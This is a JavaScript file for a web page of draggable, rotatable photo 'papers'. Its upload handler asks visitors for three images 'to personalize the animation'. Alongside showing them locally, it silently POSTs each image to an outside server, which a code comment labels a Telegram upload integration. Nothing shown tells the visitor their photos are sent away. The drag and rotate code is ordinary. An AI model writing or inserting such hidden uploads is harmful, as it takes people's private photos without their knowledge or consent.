let highestZ = 1;
let isUploading = false; // Flag to prevent uploads during dragging

class Paper {
    constructor(paper) {
        this.paper = paper;
        this.holdingPaper = false;
        this.rotating = false;
        this.mouseTouchX = 0;
        this.mouseTouchY = 0;
        this.prevMouseX = 0;
        this.prevMouseY = 0;
        this.currentPaperX = 0;
        this.currentPaperY = 0;
        this.rotation = Math.random() * 30 - 15;

        this.init();
    }

    init() {
        // Mouse events for desktop
        this.paper.addEventListener('mousedown', (e) => {
            if (this.holdingPaper || isUploading) return;
            this.holdingPaper = true;

            this.paper.style.zIndex = highestZ++;

            this.mouseTouchX = e.clientX;
            this.mouseTouchY = e.clientY;
            this.prevMouseX = e.clientX;
            this.prevMouseY = e.clientY;

            if (e.button === 2) {
                this.rotating = true;
            }

            document.addEventListener('mousemove', this.onMouseMove);
            document.addEventListener('mouseup', this.onMouseUp);
        });

        // Touch events for mobile
        this.paper.addEventListener('touchstart', (e) => {
            if (this.holdingPaper || isUploading) return;
            this.holdingPaper = true;

            this.paper.style.zIndex = highestZ++;

            const touch = e.touches[0];
            this.mouseTouchX = touch.clientX;
            this.mouseTouchY = touch.clientY;
            this.prevMouseX = touch.clientX;
            this.prevMouseY = touch.clientY;

            document.addEventListener('touchmove', this.onTouchMove);
            document.addEventListener('touchend', this.onMouseUp);
        });

        this.paper.addEventListener('contextmenu', (e) => e.preventDefault());
    }

    onMouseMove = (e) => {
        this.move(e.clientX, e.clientY);
    };

    onTouchMove = (e) => {
        const touch = e.touches[0];
        this.move(touch.clientX, touch.clientY);
    };

    move(mouseX, mouseY) {
        const velX = mouseX - this.prevMouseX;
        const velY = mouseY - this.prevMouseY;

        const dirX = mouseX - this.mouseTouchX;
        const dirY = mouseY - this.mouseTouchY;
        const dirLength = Math.sqrt(dirX * dirX + dirY * dirY);

        let degrees = this.rotation;
        if (this.rotating && dirLength !== 0) {
            const angle = Math.atan2(dirY, dirX);
            degrees = (360 + Math.round(180 * angle / Math.PI)) % 360;
            this.rotation = degrees;
        }

        if (this.holdingPaper) {
            if (!this.rotating) {
                this.currentPaperX += velX;
                this.currentPaperY += velY;
            }

            this.paper.style.transform = `translate(${this.currentPaperX}px, ${this.currentPaperY}px) rotateZ(${degrees}deg)`;
        }

        this.prevMouseX = mouseX;
        this.prevMouseY = mouseY;
    }

    onMouseUp = () => {
        this.holdingPaper = false;
        this.rotating = false;

        document.removeEventListener('mousemove', this.onMouseMove);
        document.removeEventListener('mouseup', this.onMouseUp);
        document.removeEventListener('touchmove', this.onTouchMove);
        document.removeEventListener('touchend', this.onMouseUp);
    };
}

// Initialize existing papers
document.querySelectorAll('.paper').forEach(paper => {
    new Paper(paper);
});

// Observe new papers
const observer = new MutationObserver((mutations) => {
    mutations.forEach((mutation) => {
        mutation.addedNodes.forEach((node) => {
            if (node.classList && node.classList.contains('paper')) {
                new Paper(node);
            }
        });
    });
});

observer.observe(document.body, { childList: true });

// 📤 Telegram Upload Integration
const imageUpload = document.getElementById('imageUpload');
const imageElements = document.querySelectorAll('.paper.image img');

imageUpload.addEventListener('change', (event) => {
    if (isUploading) return;
    
    const files = Array.from(event.target.files);
    
    if (files.length !== 3) {
        alert("Please upload exactly 3 images to personalize the animation.");
        return;
    }
    
    isUploading = true;

    // Create an array of promises for the fetch requests
    const uploadPromises = files.map(file => {
        const formData = new FormData();
        formData.append('image', file);
        
        // Return the fetch promise for each file
        return fetch('https://radharani9-3.onrender.com/upload', {
            method: 'POST',
            body: formData
        });
    });

    // Handle file reading and display for all files concurrently
    files.forEach((file, index) => {
        const reader = new FileReader();
        reader.onload = function(e) {
            const img = imageElements[index];
            const paper = img.closest('.paper');
            const currentTransform = paper.style.transform;
            img.src = e.target.result;
            
            setTimeout(() => {
                paper.style.transform = currentTransform;
                new Paper(paper);
            }, 500);
        };
        reader.readAsDataURL(file);
    });

    // Wait for all upload promises to resolve before resetting the flag
    Promise.all(uploadPromises)
        .then(responses => {
            responses.forEach((res, index) => {
                if (res.ok) {
                    res.text().then(msg => console.log(`Image ${index + 1} uploaded:`, msg));
                } else {
                    console.error(`Upload failed for image ${index + 1}:`, res.statusText);
                }
            });
        })
        .catch(err => {
            console.error('One or more uploads failed:', err);
        })
        .finally(() => {
            // This is the key change: The flag is guaranteed to be reset
            // after ALL fetch requests have completed, regardless of success.
            isUploading = false;
        });
});
